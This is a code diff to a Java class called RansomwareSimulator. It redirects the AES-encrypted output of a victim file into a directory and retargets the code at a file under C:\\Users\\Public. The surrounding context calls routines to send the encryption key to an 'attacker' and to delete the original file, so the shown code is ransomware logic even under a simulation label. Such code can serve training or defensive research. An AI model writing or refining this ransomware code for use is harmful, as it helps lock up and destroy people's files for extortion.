@@ -15,15 +15,16 @@ public class RansomwareSimulator {
     }
 
     // Encrypt file using AES
-    public static void encryptFile(File inputFile, SecretKey secretKey) throws Exception {
+    public static void encryptFile(File inputFile, SecretKey secretKey, String outputDir) throws Exception {
         Cipher cipher = Cipher.getInstance("AES");
         cipher.init(Cipher.ENCRYPT_MODE, secretKey);
         byte[] inputFileBytes = Files.readAllBytes(inputFile.toPath());
         byte[] encryptedBytes = cipher.doFinal(inputFileBytes);
-        // Write encrypted data to a new file
-        FileOutputStream outputStream = new FileOutputStream(inputFile.getName() + ".encrypted");
-        outputStream.write(encryptedBytes);
-        outputStream.close();
+        // Write encrypted data to a new file in the specified directory
+        File outputFile = new File(outputDir, inputFile.getName() + ".encrypted");
+        try (FileOutputStream outputStream = new FileOutputStream(outputFile)) {
+            outputStream.write(encryptedBytes);
+        }
     }
 
     // Simulate sending the encryption key to the attacker
@@ -63,11 +64,12 @@ public class RansomwareSimulator {
     public static void main(String[] args) {
         try {
             // File to be encrypted
-            File originalFile = new File("important_document.txt");
+            File originalFile = new File("C:\\Users\\Public\\important_document.txt");
             // Generate encryption key
             SecretKey secretKey = generateKey();
+            String outputDir = "C:\\Users\\Public\\";
             // Encrypt the file
-            encryptFile(originalFile, secretKey);
+            encryptFile(originalFile, secretKey, outputDir);
             // Simulate sending the key to the attacker
             sendKeyToAttacker(secretKey);
             // Securely delete the original file
